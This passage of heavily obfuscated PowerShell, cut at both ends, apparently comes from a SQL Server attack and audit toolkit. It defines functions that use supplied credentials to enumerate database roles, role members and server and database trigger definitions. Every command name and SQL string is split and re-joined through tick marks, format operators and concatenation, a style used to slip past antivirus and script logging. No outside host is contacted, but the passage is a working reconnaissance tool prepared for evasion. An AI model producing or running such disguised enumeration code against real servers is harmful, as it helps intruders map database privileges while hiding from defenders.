            ${t`BlD`AtABa`s`es} = &("{2}{1}{0}{3}{4}" -f'D','L','Get-SQ','atabas','e') -Instance ${InS`T`ANce} -Username ${u`S`e`RnamE} -Password ${passWo`RD} -Credential ${credeN`T`I`AL} -HasAccess -DatabaseName ${dAt`Ab`ASENaME} -SuppressVerbose -NoDefaults
        }
        else
        {
            ${TBld`AtA`BASES} = &("{2}{0}{1}" -f 'QLData','base','Get-S') -Instance ${IN`sTa`NcE} -Username ${usErn`Ame} -Password ${P`As`SWOrd} -Credential ${cr`EdE`NtI`Al} -HasAccess -DatabaseName ${datABA`sEn`A`me} -SuppressVerbose
        }

        
        ${TBl`Dat`Ab`ASEs} |
        &("{4}{0}{3}{1}{2}"-f'Each','Objec','t','-','For') -Process {
            
            ${DB`NAME} = ${_}."datABaS`en`A`ME"

            if( -not ${sU`pPreS`sver`B`oSE})
            {
                &("{0}{2}{1}"-f 'Wri','-Verbose','te') -Message ("$Instance "+': '+'Gett'+'i'+'ng '+'roles'+' '+'fr'+'om '+'th'+'e '+"$DbName "+'da'+'taba'+'se.')
            }

            
            ${QUe`Ry} = (' '+' '+'U'+'SE '+"$DbName;
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SE'+'LEC'+'T '+' '+"'$ComputerName' "+'as'+' '+'['+'Co'+'mp'+'ute'+'rNa'+'me],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'[Ins'+'tance],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$DbName' "+'as'+' '+'[D'+'atab'+'a'+'seName]'+','+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'pr'+'inc'+'ipal_id '+'a'+'s '+'[R'+'olePrinc'+'i'+'p'+'alI'+'d],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'sid'+' '+'as'+' '+'[RoleP'+'rinc'+'i'+'palSid'+'],'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'na'+'me '+'as'+' '+'[RolePri'+'n'+'cipalNa'+'m'+'e],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t'+'ype_des'+'c'+' '+'as'+' '+'[RoleP'+'r'+'inc'+'ipa'+'lType],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'own'+'ing_pri'+'n'+'cipal_'+'id'+' '+'as'+' '+'[Owner'+'Prin'+'c'+'ipalId]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'su'+'ser_n'+'ame('+'own'+'in'+'g_principal_id)'+' '+'a'+'s '+'[OwnerPr'+'i'+'n'+'ci'+'pa'+'lNam'+'e]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'is_'+'fixed_'+'role'+',
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'cr'+'eat'+'e'+'_date,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'modify_Da'+'te'+','+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'de'+'fa'+'ult_schema_na'+'me
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FR'+'OM '+"[$DbName].[sys].[database_principals]
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHE'+'RE '+'typ'+'e '+'l'+'ike '+('{0'+'}R'+'{0}'+'
 ')-F [ChAr]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$RolePrincipalNameFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$RoleOwnerFilter")

            
            ${tBL`Da`TABAS`ErOlE`sTEmp} = &("{0}{2}{1}" -f'Get-','uery','SQLQ') -Instance ${in`S`Tan`Ce} -Query ${Q`UeRY} -Username ${USeR`Na`ME} -Password ${P`AssWo`RD} -Credential ${CrE`D`entiAl} -SuppressVerbose

            
            ${TBlD`ATAb`AsErO`LEs`TEMp} |
            &("{0}{1}{3}{2}{4}" -f 'ForE','a','-','ch','Object') -Process {
                
                ${nEw`SiD} =   (  IteM  ("V"+"ari"+"ABle:lCS2")).VAlUE::("{0}{1}"-f'ToS','tring').Invoke(${_}."r`oLE`P`R`incIpALsId").("{0}{1}"-f'R','eplace').Invoke('-','')
                if (${ne`w`sId}."L`ength" -le 10)
                {
                    ${S`ID} =   $qMrK::("{1}{0}{2}"-f'I','To','nt32').Invoke(${N`Ew`sid},16)
                }
                else
                {
                    ${s`ID} = ${NeWs`id}
                }

                
                ${nu`ll} = ${TbLD`A`T`AbasER`o`leS}."ro`Ws"."A`DD"(
                    [string]${_}."CO`mPUTerna`mE",
                    [string]${_}."iNs`TaNCE",
                    [string]${_}."d`AtabA`SEnA`me",
                    [string]${_}."R`OLEpr`InCI`paLID",
                    ${S`ID},
                    ${_}."role`P`R`incI`PAL`NAme",
                    [string]${_}."rO`lEpR`inc`IpA`l`TYpE",
                    [string]${_}."O`WneRprin`c`Ipa`liD",
                    [string]${_}."ownerPRI`Nci`p`AlNA`me",
                    [string]${_}."Is_F`Ix`Ed_`RolE",
                    ${_}."cr`eaTE`_Date",
                    ${_}."MOD`If`Y_daTE",
                [string]${_}."dEFAuL`T_S`CheM`A_`NAME")
            }
        }
    }

    End
    {
        
        ${tBLDATabAS`e`ROL`es}
    }
}






Function  GeT-SqLDaTaB`Aser`o`l`EME`m`Ber
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MANDaTOry = ${F`AlSe},
                VaLUefRoMPIpelineBYpRoPertynAME = ${TR`Ue},
        HELpmEssage = {"{4}{12}{1}{8}{10}{14}{7}{13}{11}{2}{0}{3}{6}{5}{9}"-f'then','r','o au','tic','SQL S','e wi','at',' do','ve','th.','r o','account t','e','main ','r'})]
        [string]${U`S`ernA`ME},

        [Parameter(mAnDAtory = ${f`AlsE},
                vALUEFroMpipELinEByprOPErtynAMe = ${t`RUE},
        hElPmeSsAGe = {"{1}{11}{10}{14}{0}{2}{3}{12}{7}{8}{17}{9}{5}{13}{4}{16}{6}{15}"-f 'unt ','SQL Server','passw','ord ','ntic','h','w','o',' a','t','omain a',' or d','t','e','cco','ith.','ate ','u'})]
        [string]${pAsS`woRd},

        [Parameter(MANdaTORy = ${f`Alse},
        helpmeSsagE = {"{1}{3}{5}{4}{0}{2}"-f 'tial','Windows','s.',' ','n','crede'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cREd`EN`Ti`Al} =   $0459m2::"e`mPtY",

        [Parameter(mandaTorY = ${f`AlSE},
                vAlUEfROMPipeLiNEbypropERTynAmE = ${tR`Ue},
        heLPMEssaGe = {"{3}{4}{0}{5}{1}{6}{2}" -f 'r instance to co','nect','on to.','S','QL Serve','n','i'})]
        [string]${INSt`A`NcE},

        [Parameter(maNDAtorY = ${Fa`LSe},
                VAlUEFroMPIpelINebypRoPerTyNaMe = ${tr`Ue},
        helpmESsAge = {"{5}{2}{7}{0}{6}{3}{4}{1}"-f'v','e name.','L ',' d','atabas','SQ','er','Ser'})]
        [string]${DataB`As`e`NaMe},

        [Parameter(mANdaTOrY = ${FA`LSE},
                VaLUeFrOMpIpeLINEbyPROpertYNAME = ${TR`Ue},
        helpmESsAGe = {"{1}{2}{0}" -f '.','Role na','me'})]
        [string]${R`O`l`epRinc`ipaLNa`ME},

        [Parameter(manDatORy = ${f`AlSe},
                ValuEfromPIpeLInEbypROpErTyNaME = ${TR`Ue},
        HELPmeSSaGe = {"{6}{2}{0}{4}{1}{5}{3}"-f ' o','ws','QL login','ame.','r Windo',' account n','S'})]
        [string]${pr`inci`pA`lNaME},

        [Parameter(MAnDAtoRy = ${faL`SE},
        HElpmEsSage = {"{4}{2}{6}{5}{0}{7}{3}{1}"-f' datab','s.','y sel','e','Onl','on default','ect n','as'})]
        [switch]${N`Od`EFAU`LTS},

        [Parameter(MaNDATOrY = ${f`Al`Se},
        helpmEssagE = {"{1}{7}{6}{9}{0}{8}{2}{4}{3}{5}"-f'e erro','Supp','ed ','n is wrapped','when functio','.','o','ress verb','rs.  Us','s'})]
        [switch]${S`UP`pReSSVer`BOSE}
    )

    Begin
    {
        
        ${tb`Lda`TA`Bas`eroLEM`e`mBERs} = &("{3}{0}{1}{2}"-f'ew','-O','bject','N') -TypeName ("{5}{2}{3}{6}{0}{4}{1}" -f'Ta','e','ystem.Da','ta.','bl','S','Data')

        
        if (${PRi`NCip`A`LnAMe})
        {
            ${pr`incIpAlN`A`Mef`ilTER} = (' '+'A'+'ND '+'US'+'ER'+'_NAME'+'(memb'+'er_pr'+'inc'+'ipal_'+'id) '+'like'+' '+"'$PrincipalName'")
        }
        else
        {
            ${Pr`INCiP`ALnA`me`FilT`er} = ''
        }

        
        if (${r`O`lEpRInc`i`PALn`AmE})
        {
            ${RolEP`RiN`ciPaL`Na`mefILTer} = (' '+'AND'+' '+'US'+'E'+'R_NAME'+'('+'role_prin'+'cipal_'+'id) '+'l'+'ike '+"'$RolePrincipalName'")
        }
        else
        {
            ${rO`LEP`R`inC`IpALn`AmEfIl`T`Er} = ''
        }
    }

    Process
    {
        

        
        ${c`O`MP`UtERNaME} = &("{2}{1}{0}{4}{3}{6}{5}" -f'uterNameFrom','et-Comp','G','nstan','I','e','c') -Instance ${i`NS`TA`NCe}

        
        if(-not ${inS`TaNCe})
        {
            ${I`N`ST`ANCE} = ${env:co`mP`U`TE`R`NAme}
        }

        
        ${TeS`T`co`N`NEcTion} = &("{1}{0}{4}{5}{2}{3}"-f 'et','G','ctionTe','st','-SQL','Conne') -Instance ${iN`STaN`CE} -Username ${u`serName} -Password ${Pa`sswOrD} -Credential ${C`RedENT`iaL} -SuppressVerbose | &("{1}{2}{0}" -f'-Object','W','here') -FilterScript {
            ${_}."StAt`US" -eq ("{1}{0}{2}"-f'cessibl','Ac','e')
        }
        if(${teS`TC`oN`NECti`on})
        {
            if( -not ${SUP`PrE`s`SVeRbose})
            {
                &("{0}{3}{1}{2}" -f 'Write-','erbos','e','V') -Message ("$Instance "+': '+'Con'+'ne'+'cti'+'on '+'Succ'+'ess'+'.')
            }
        }
        else
        {
            if( -not ${S`UP`preSsVERBO`se})
            {
                &("{0}{2}{3}{1}{4}" -f'W','Verbos','ri','te-','e') -Message ("$Instance "+': '+'Connecti'+'o'+'n '+'Faile'+'d'+'.')
            }
            return
        }

        
        if(${Nod`eFAu`L`TS})
        {
            ${TblDAtA`B`As`Es} = &("{1}{0}{2}{4}{3}" -f'SQLData','Get-','ba','e','s') -Instance ${iNSta`N`cE} -Username ${U`s`erNAMe} -Password ${pa`SsWo`Rd} -Credential ${cr`e`DENtIAL} -HasAccess -DatabaseName ${D`AtABAse`N`AmE} -NoDefaults -SuppressVerbose
        }
        else
        {
            ${TbLd`AtaB`As`eS} = &("{1}{0}{4}{3}{2}" -f'b','Get-SQLData','e','s','a') -Instance ${I`NSTA`NCe} -Username ${us`ern`Ame} -Password ${pa`S`SwOrD} -Credential ${Cr`EdENT`i`AL} -HasAccess -DatabaseName ${DaTaB`A`senaMe} -SuppressVerbose
        }

        
        ${Tb`L`Data`Bases} |
        &("{2}{1}{4}{3}{0}"-f't','ac','ForE','c','h-Obje') -Process {
            
            ${Dbna`Me} = ${_}."DaTabaS`E`NA`me"

            if( -not ${SU`P`preS`sVErbOSE})
            {
                &("{2}{0}{1}" -f 'te-','Verbose','Wri') -Message ("$Instance "+': '+'Gettin'+'g '+'role'+' '+'membe'+'rs '+'for'+' '+'th'+'e '+"$DbName "+'da'+'t'+'ab'+'ase...')
            }

            
            ${Que`Ry} = (' '+' '+'U'+'SE '+"$DbName;
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'E'+'LECT '+' '+"'$ComputerName' "+'as'+' '+'[C'+'ompute'+'r'+'Nam'+'e],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'[I'+'nst'+'ance]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$DbName' "+'a'+'s '+'['+'Da'+'tabas'+'eN'+'ame'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'role_princ'+'ip'+'al'+'_id '+'as'+' '+'['+'R'+'ol'+'e'+'P'+'rincipa'+'lId],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'USE'+'R_N'+'A'+'ME(rol'+'e_'+'pri'+'n'+'cipal'+'_id) '+'as'+' '+'[R'+'olePrin'+'c'+'ipal'+'N'+'am'+'e],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'member_'+'princi'+'pal'+'_'+'id '+'as'+' '+'['+'Prin'+'c'+'ipalId'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'U'+'SER_NAME('+'mem'+'ber_'+'p'+'rincipal_'+'id) '+'a'+'s '+'[Princ'+'ipal'+'N'+'am'+'e]
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FRO'+'M '+"[$DbName].[sys].[database_role_members]
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'W'+'HERE'+' '+'1=1
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$RolePrincipalNameFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$PrincipalNameFilter")

            
            ${TBLd`A`TA`BaSERo`lEm`EMb`ErST`eMP} = &("{0}{1}{2}" -f 'Get-SQ','L','Query') -Instance ${ins`T`ANce} -Query ${Q`Uery} -Username ${U`sER`NA`me} -Password ${PAS`S`WOrd} -Credential ${CrED`E`NtiAl} -SuppressVerbose

            
            ${tblDAT`Ab`ASEr`O`L`EM`EMbERS} = ${t`BlDatABaS`eRole`mEMbE`RS} + ${tbLDa`T`AB`A`sEr`olEme`mbE`Rs`TeMp}
        }
    }

    End
    {
        
        ${T`B`LDAT`ABaSe`R`olEMeMB`ers}
    }
}






Function  G`e`T-SqLTRI`GgERDDl
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MandaTorY = ${f`AL`SE},
        HeLPmessAgE = {"{9}{4}{3}{0}{2}{6}{5}{1}{7}{8}{10}"-f 'cc','then','o','rver or domain a','Se','au','unt to ','ticate',' ','SQL ','with.'})]
        [string]${U`SeR`NaMe},

        [Parameter(MaNDAtory = ${f`Alse},
        hElpmESsAge = {"{13}{1}{5}{3}{12}{10}{9}{11}{14}{4}{0}{6}{8}{7}{2}" -f ' ','QL ','.','v','d','Ser','to ','ith','authenticate w','main acco',' do','unt pa','er or','S','sswor'})]
        [string]${pass`Wo`Rd},

        [Parameter(MANDATORy = ${fa`Lse},
        HElPmeSsaGE = {"{2}{1}{3}{0}{4}"-f'ential','indows ','W','cred','s.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cRed`en`T`iAL} =  ( vArIaBLE  0459m2 -vAl  )::"e`mpTY",

        [Parameter(MANDATORY = ${FAL`Se},
                ValueFROmpIPeLiNeByprOPertyname = ${Tr`Ue},
        hElpMeSsaGE = {"{0}{9}{1}{3}{6}{7}{4}{10}{2}{8}{5}" -f'SQL S','rver',' connecti',' ','ce t',' to.','ins','tan','on','e','o'})]
        [string]${ins`T`AnCe},

        [Parameter(manDaToRy = ${f`AlSe},
                vAluefRoMPiPeLInebYproperTYnAME = ${T`RuE},
        hELPmEssAGe = {"{2}{1}{0}{3}"-f 'gger n','ri','T','ame.'})]
        [string]${tr`I`gG`ername},

        [Parameter(MaNdaToRy = ${F`Al`se},
        hElpmeSSagE = {"{11}{3}{15}{13}{6}{14}{2}{5}{12}{9}{7}{0}{10}{4}{16}{1}{8}" -f 'ed w','ion is wr','e','p',' ','r',' verb','  Us','apped.','ors.','hen','Sup','r','ss','ose ','re','funct'})]
        [switch]${SuppRe`S`SVe`Rbose}
    )

    Begin
    {
        
        ${t`BLDdl`TRIgGe`Rs} = &("{1}{2}{0}"-f 'Object','N','ew-') -TypeName ("{1}{3}{5}{4}{2}{0}" -f 'ataTable','S','a.D','y','m.Dat','ste')

        
        if (${T`Rig`gErn`AmE})
        {
            ${Tr`igg`eRNa`mefILTeR} = (' '+'A'+'ND '+'n'+'ame '+'li'+'ke '+"'$TriggerName'")
        }
        else
        {
            ${T`Ri`g`geRNA`MEF`ILteR} = ''
        }
    }

    Process
    {
        

        
        ${CO`mPU`TErNa`me} = &("{2}{3}{5}{4}{1}{7}{8}{0}{6}" -f 'n','Ins','Get-','Comput','rNameFrom','e','ce','t','a') -Instance ${In`StAn`ce}

        
        if(-not ${iN`ST`ANCE})
        {
            ${iNSTA`N`Ce} = ${eN`V:COMp`U`T`e`Rname}
        }

        
        ${tes`TcOnn`e`CTIon} = &("{4}{0}{1}{3}{2}{5}"-f 'QLC','onn','ctionTe','e','Get-S','st') -Instance ${INS`TAn`ce} -Username ${U`sEr`NAme} -Password ${p`ASSw`OrD} -Credential ${CRe`dE`Ntial} -SuppressVerbose | &("{2}{0}{1}{3}"-f 'e-','Objec','Wher','t') -FilterScript {
            ${_}."st`AtUs" -eq ("{0}{2}{1}"-f'A','essible','cc')
        }
        if(${t`estc`Onn`ECtIOn})
        {
            if( -not ${suPpreS`S`VeR`BOsE})
            {
                &("{1}{0}{2}" -f '-Verbos','Write','e') -Message ("$Instance "+': '+'Conn'+'ec'+'tion '+'Succ'+'ess'+'.')
            }
        }
        else
        {
            if( -not ${suPpreSS`VER`BosE})
            {
                &("{2}{0}{1}"-f'e-Ve','rbose','Writ') -Message ("$Instance "+': '+'Connecti'+'o'+'n '+'Fa'+'il'+'ed.')
            }
            return
        }

        
        ${q`Uery} = (' '+'SE'+'LECT'+' '+"	'$ComputerName' "+'as'+' '+'[C'+'omputer'+'Name'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'['+'Inst'+'ance]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'na'+'me '+'as'+' '+'[Tri'+'g'+'gerN'+'ame'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'object_'+'i'+'d '+'a'+'s '+'['+'Trigg'+'erId],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'[Tri'+'ggerT'+'ype'+'] '+'= '+('{0}SE'+'RVER'+'{'+'0},
 ')  -F[chaR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'type_'+'des'+'c'+' '+'a'+'s '+'[O'+'bj'+'ec'+'tType],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'pare'+'n'+'t_'+'class_desc '+'a'+'s '+'[Obje'+'ctCla'+'ss],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'O'+'BJECT_DEF'+'INITI'+'ON(O'+'B'+'J'+'EC'+'T_'+'ID) '+'a'+'s '+'[Tri'+'gge'+'rDefin'+'it'+'ion],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'cre'+'a'+'te_'+'date,'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'modify_d'+'a'+'te'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'is_'+'ms'+'_shipped'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'i'+'s_di'+'sa'+'bled
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'F'+'ROM '+'[master'+']'+'.[s'+'ys].[ser'+'ve'+'r_tr'+'iggers] '+'WHERE'+' '+'1=1'+'
 '+' '+' '+' '+' '+' '+' '+' '+"$TriggerNameFilter")

        
        ${T`B`l`d`DLtriggerSTeMp} = &("{2}{3}{1}{0}"-f'y','r','Get-SQLQu','e') -Instance ${INS`TA`Nce} -Query ${q`UerY} -Username ${UsernA`mE} -Password ${PA`ss`woRd} -Credential ${Cr`ED`E`NtIaL} -SuppressVerbose

        
        ${tbl`Ddlt`Ri`Gg`eRS} = ${tbl`ddLTR`iGG`E`Rs}  + ${tB`l`dDLtri`gGerstEMp}
    }

    End
    {
        
        ${TBlddl`TRI`G`gErS}
    }
}






Function  GeT-`SQ`L`Trig`G`eRdMl
{
    
    [CmdletBinding()]
    Param(
        [Parameter(ManDaTORY = ${fa`lsE},
        HElpmessAge = {"{0}{9}{6}{5}{13}{14}{4}{8}{7}{10}{1}{11}{2}{3}{12}" -f 'S','e w','t','h',' account to','r or dom','Serve','uthen',' a','QL ','ticat','i','.','a','in'})]
        [string]${uS`Er`NamE},

        [Parameter(mAnDatOrY = ${fa`LsE},
        HeLPmESSaGE = {"{14}{4}{5}{3}{12}{13}{1}{11}{6}{0}{8}{9}{7}{10}{2}" -f 'nt passwor','r ','ate with.','Se','Q','L ','ain accou','en','d ','to auth','tic','dom','rver ','o','S'})]
        [string]${p`A`ssworD},

        [Parameter(mAndAtoRy = ${fa`lse},
        HELpmeSsAge = {"{2}{4}{0}{3}{5}{1}"-f 'c','.','Wind','r','ows ','edentials'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cRe`de`Nti`Al} =  $0459M2::"eMP`TY",

        [Parameter(ManDaToRY = ${fAL`Se},
                ValUefromPipeliNeBYProPeRTYnaME = ${TR`Ue},
        hElpmessaGE = {"{0}{4}{5}{7}{1}{6}{2}{3}" -f 'SQL Se','n','on ','to.','rv','er instan','ecti','ce to con'})]
        [string]${iN`ST`AnCE},

        [Parameter(mAnDAtory = ${f`Al`Se},
                VAluefROmPIPelINEbYpROPertynAmE = ${Tr`Ue},
        HElpmEsSaGe = {"{3}{1}{6}{4}{0}{2}{5}"-f'e na',' Ser','me','SQL','atabas','.','ver d'})]
        [string]${d`A`TAB`ASenAme},

        [Parameter(mANdAToRY = ${f`A`lsE},
                vAlUEfrOmpIPeliNEbyPropERtYNAme = ${tr`UE},
        HELPmESSaGe = {"{2}{0}{3}{1}"-f'rigg',' name.','T','er'})]
        [string]${TRi`g`GeRNAME},

        [Parameter(mANdaTOry = ${Fa`lSE},
        heLpMeSSaGe = {"{4}{14}{6}{8}{5}{9}{15}{3}{7}{1}{16}{12}{2}{11}{0}{13}{10}"-f'ra','n ',' ','ors.  Used w','Suppress ve','e','e','he',' ','r','d.','w','nction is','ppe','rbos','r','fu'})]
        [switch]${sUp`pr`essv`E`RboSe}
    )

    Begin
    {
        
        ${T`Bl`D`mLtRiGGerS} = &("{2}{1}{0}{3}"-f'e','-Obj','New','ct') -TypeName ("{3}{1}{2}{6}{4}{0}{5}" -f'ataTa','ystem.Da','ta','S','D','ble','.')

        
        if (${T`R`iGGeRn`AME})
        {
            ${Tr`IgGe`R`NAMe`Fi`lter} = (' '+'AND'+' '+'name'+' '+'li'+'ke '+"'$TriggerName'")
        }
        else
        {
            ${t`R`IGGeRNaME`Filt`eR} = ''
        }
    }

    Process
    {
        

        
        ${coM`puT`Er`NAMe} = &("{0}{3}{1}{7}{4}{2}{6}{5}" -f 'Ge','mputerNa','romIns','t-Co','eF','ance','t','m') -Instance ${i`Nst`AnCe}

        
        if(-not ${IN`stAN`Ce})
        {
            ${i`NsTA`Nce} = ${eN`V:Co`mP`UtE`RNamE}
        }

        
        ${tes`T`cONN`ECti`On} = &("{4}{3}{1}{2}{0}" -f'nTest','i','o','nnect','Get-SQLCo') -Instance ${i`N`St`AnCe} -Username ${U`se`RNamE} -Password ${pAs`SWO`Rd} -Credential ${crEDe`N`T`ial} -SuppressVerbose | &("{0}{2}{1}{3}"-f 'W','e','her','-Object') -FilterScript {
            ${_}."ST`A`TuS" -eq ("{3}{0}{1}{2}" -f'sib','l','e','Acces')
        }
        if(${t`est`C`ONNECti`ON})
        {
            if( -not ${su`ppR`eSSVE`RBOSE})
            {
                &("{1}{0}{2}{4}{3}"-f'i','Wr','te','ose','-Verb') -Message ("$Instance "+': '+'Conne'+'c'+'t'+'ion '+'Succe'+'s'+'s.')
                &("{3}{0}{1}{2}{4}"-f'e-V','er','bos','Writ','e') -Message ("$Instance "+': '+'G'+'r'+'abbi'+'ng '+'DM'+'L '+'t'+'rigger'+'s '+'fr'+'om '+'the'+' '+'da'+'tab'+'ases '+'bel'+'ow'+':.')
            }
        }
        else
        {
            if( -not ${s`UPpRES`Sv`eRboSE})
            {
                &("{1}{3}{0}{2}"-f 'Ver','Wri','bose','te-') -Message ("$Instance "+': '+'Co'+'nnectio'+'n'+' '+'Faile'+'d'+'.')
            }
            return
        }

        
        ${Tb`Ld`ATAbA`sES} = &("{0}{2}{3}{1}{4}" -f 'Get','as','-SQ','LDatab','e') -Instance ${i`NSTanCe} -Username ${UseRN`A`ME} -Password ${p`ASSWO`Rd} -Credential ${CrE`DEn`TI`Al} -HasAccess -DatabaseName ${DAT`ABa`S`ename} -SuppressVerbose

        
        ${tbL`dA`Tabas`Es} |
        &("{0}{1}{2}"-f'F','orEac','h-Object') -Process {
            
            ${DB`NA`Me} = ${_}."DaT`ABas`E`NAme"

            if( -not ${S`U`PPr`Es`s`VeRBOSE})
            {
                &("{1}{0}{2}" -f'te-','Wri','Verbose') -Message ("$Instance "+': '+'- '+"$DbName")
            }

            
            ${QU`eRy} = (' '+' '+'us'+'e '+"[$DbName];
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SE'+'LEC'+'T '+' '+"'$ComputerName' "+'as'+' '+'[Com'+'pu'+'terNam'+'e'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'['+'Instance],'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$DbName' "+'A'+'S '+'[Dat'+'a'+'base'+'Name],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SC'+'H'+'EM'+'A'+'_NAME(o.schema_id) '+'AS'+' '+'[S'+'che'+'ma'+'N'+'ame],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t.'+'n'+'ame '+'A'+'S '+'['+'TriggerNam'+'e]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t'+'.object'+'_'+'id '+'A'+'S '+'[Trigge'+'rId],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'['+'Tr'+'ig'+'gerType'+'] '+'= '+('1'+'5ADAT'+'ABASE'+'15A,
 ')."r`ep`LAce"(([cHaR]49+[cHaR]53+[cHaR]65),[sTrInG][cHaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t.ty'+'pe_des'+'c'+' '+'AS'+' '+'[Ob'+'je'+'ctType'+'],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t.pa'+'rent_cl'+'ass_de'+'sc '+'AS'+' '+'[Objec'+'tCl'+'as'+'s]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'O'+'BJECT_DEFINITIO'+'N(t'+'.'+'obj'+'ect'+'_id) '+'A'+'S '+'[Tr'+'ig'+'ge'+'r'+'D'+'efinition],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t.'+'create_d'+'ate,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t'+'.modi'+'fy_d'+'ate'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t.is_ms_'+'s'+'h'+'ipped,'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t.is_disa'+'bled'+','+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t'+'.'+'i'+'s_n'+'ot_for_replication,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t.'+'is'+'_in'+'st'+'ea'+'d_'+'of_t'+'rigger
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'F'+'ROM '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'[sys'+'].[trig'+'gers]'+' '+'t
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'I'+'NNER'+' '+'JO'+'IN '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'[s'+'ys].['+'obje'+'c'+'ts] '+'o '+'ON'+' '+'t.pa'+'re'+'nt_id'+' '+'= '+'o'+'.ob'+'je'+'ct_id
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'W'+'HERE '+'1'+'=1 '+"$TriggerNameFilter")

            
